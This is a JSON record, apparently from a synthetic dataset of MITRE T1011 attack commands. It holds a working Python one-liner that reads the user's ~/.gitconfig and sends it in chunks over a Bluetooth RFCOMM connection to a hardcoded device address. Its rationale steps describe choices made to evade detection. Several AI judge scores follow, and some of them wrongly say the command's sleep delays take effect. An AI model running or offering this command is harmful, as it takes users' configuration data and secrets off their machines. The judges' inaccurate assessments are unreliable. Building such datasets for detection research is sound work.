{
  "technique_id": "T1011",
  "platform": "Linux",
  "shell": "Python",
  "command": "python3 -c \"import socket,os,time; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM); s.settimeout(6); s.connect(('33:44:55:66:77:88', 23)); p=os.path.expanduser('~/.gitconfig'); d=open(p,'rb').read(); [s.send(d[i:i+512]) or time.sleep(0.05) for i in range(0,len(d),512)]; s.close()\"",
  "explanation": "Streams user git configuration over Bluetooth RFCOMM channel 23 in small chunks to blend with low-volume traffic on a non-IP medium per T1011.",
  "rationale_steps": [
    "Use Bluetooth RFCOMM to create an alternate exfil channel.",
    "Select a nonstandard RFCOMM channel (23) to avoid defaults.",
    "Chunk and send data to limit conspicuous burst patterns.",
    "Close the socket to end the session cleanly."
  ],
  "obfuscation_level": "none",
  "id": "SYN-PYTHON-T1011-2e02ce6e-2550bc83",
  "source_prompt_hash": "2e02ce6e",
  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
  "validation": {
    "syntax_ok": false,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "The python -c command is properly quoted with balanced parentheses and valid Python/socket constructs, making it parseable as-is.",
        "semantic_score": 4,
        "semantic_justification": "It reads ~/.gitconfig and sends it over a Bluetooth RFCOMM connection in 512-byte chunks consistent with T1011, though the 'or time.sleep(0.05)' will not execute and partial sends arenâ€™t handled, reducing reliability/stealth.",
        "combined_score": 4.5,
        "confidence": 0.9,
        "timestamp": "2025-10-01T00:37:07.547824Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for imports, socket creation, connection, file reading, and data transmission.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements T1011 by exfiltrating the user's git configuration file over Bluetooth RFCOMM (an alternative network medium) in small chunks with timing delays to avoid detection.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T00:37:15.046919Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and valid Python syntax, ensuring it is parseable and runnable.",
        "semantic_score": 5,
        "semantic_justification": "The command correctly uses Python's socket module for Bluetooth RFCOMM communication, reads the specified user configuration file, and streams its content in chunks to a remote Bluetooth address, directly matching the claimed T1011 technique and explanation.",
        "combined_score": 5.0,
        "confidence": 1,
        "timestamp": "2025-10-01T06:14:50.908194Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 4.667,
    "llm_average_score": 4.833,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null,
    "Syntax_Run_Details": "mypy issues:\nC:\\Users\\flacman\\AppData\\Local\\Temp\\tmpokylc2hb.py:1: error: \"sleep\" does not return a value (it only ever returns None)  [func-returns-value]\nFound 1 error in 1 file (checked 1 source file)"
  }
}
